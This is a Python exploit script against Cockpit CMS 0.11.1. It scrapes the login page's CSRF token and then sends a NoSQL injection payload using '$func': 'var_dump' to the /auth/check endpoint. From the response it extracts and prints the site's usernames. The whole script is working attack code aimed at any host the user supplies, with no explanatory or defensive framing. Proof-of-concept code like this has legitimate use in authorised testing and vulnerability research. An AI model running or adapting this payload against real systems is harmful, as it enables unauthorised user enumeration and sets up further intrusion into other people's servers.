#!/usr/bin/env python3

import argparse
import re

import requests

__author__ = "John Hammond"

parser = argparse.ArgumentParser()
parser.add_argument("--ssl", "-s", help="use HTTPs rather than HTTP", default=False)
parser.add_argument("rhost", help="Cockpit 0.11.1 hostname or IP address")
parser.add_argument(
    "--targeturi", "-t", help="Cockpit URL location, example /cockpit", default="/"
)

args = parser.parse_args()

url = (
    f"http://{args.rhost}{args.targeturi}"
    if not args.ssl
    else f"https://{args.rhost}{args.targeturi}"
)


print("[*] requesting login page")
try:
    r = requests.get(url)
except:
    print("[!] failed to access host")
    exit(-1)

try:
    csfr = re.findall(r'csfr : "(.+)"', r.text)[0]
except:
    print("[!] failed to retrieve csfr token")
    exit(-1)
print(f"[+] retrieved csfr token: {csfr}")


print(f"[*] leaking usernames with nosql on {args.targeturi}/auth/check")

r = requests.post(
    f"{url}/auth/check",
    json={"auth": {"user": {"$func": "var_dump"}, "password": [0]}, "csfr": csfr},
)

users = []
for line in r.text.split("\n"):
    m = re.search(r'string\(\d+\) "(.+)"', line)
    if m:
        users.append(m.group(1))

if not users:
    print("[-] no users found :(")
    exit(-1)

print("[+] successfully leaked usernames!")
print("[+] users found were: ")
for user in users:
    print(f"    {user}")
